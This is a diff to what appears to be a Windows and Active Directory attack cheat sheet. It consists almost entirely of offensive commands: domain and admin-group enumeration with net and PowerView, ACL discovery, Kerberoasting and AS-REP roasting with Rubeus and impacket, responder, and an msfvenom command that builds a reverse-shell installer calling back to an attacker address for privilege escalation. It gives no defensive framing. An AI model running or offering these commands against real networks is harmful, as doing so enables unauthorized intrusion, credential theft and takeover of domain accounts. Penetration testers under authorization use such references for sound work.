@@ -12,7 +12,7 @@ $ echo %USERNAME%
 $ whoami /priv
 $ whoami /user
 $ whoami /groups
-$ net user
+$ net user <username> /domain
 $ net localgroup
 $ net localgroup administrators
 $ net accounts
@@ -30,6 +30,23 @@ $ dir C:\ /s /b | findstr /i "confidential.txt"
 
 * If you got the RDP session, Escalate privileges to SYSTEM create msfvenom
 $ msfvenom -p windows/x64/shell_reverse_tcp lhost=yourip lport=9443 -f msi -o aie.msi
+
+* Using Powerview:
+$ Import-Module .\PowerView.ps1
+$ $self = $env:USERNAME
+$ Get-NetGroupMember -GroupName "Domain Admins" -Recurse | select MemberName
+$ Find-LocalAdminAccess
+$ Invoke-EnumerateLocalAdmin
+$ Get-DomainGPOUserLocalGroupMapping -Identity $env:USERNAME
+$ Get-NetDomain
+$ Get-NetDomainController
+$ Get-NetUser -Domain yourdomain.local
+$ Get-NetComputer -Properties operatingsystem
+
+ACL & Membership
+$ Get-NetGroup -Domain yourdomain.local
+$ Get-DomainGroupMember "Domain Admins" -Recurse
+$ Get-ObjectAcl -Identity "username"
 
 * Log Reader
 $ net localgroup "Event Log Readers"
@@ -251,6 +268,10 @@ $ cd C:\windows.old\windows\system32 (find SAM and SYSTEM) if any
 $ responder en0tun
 $ rubeus.exe kerberoast /outfile:hashes.kerberoast
 $ rubeus.exe kerberoast /user:username /nowrap
+
+* Kerberoasting
+$ GetUserSPNs.py -request
+$ GetNPUsers.py -no-preauth
 
 * xp_cmdshell in mssqlclient:
 xp_cmdshell activated:
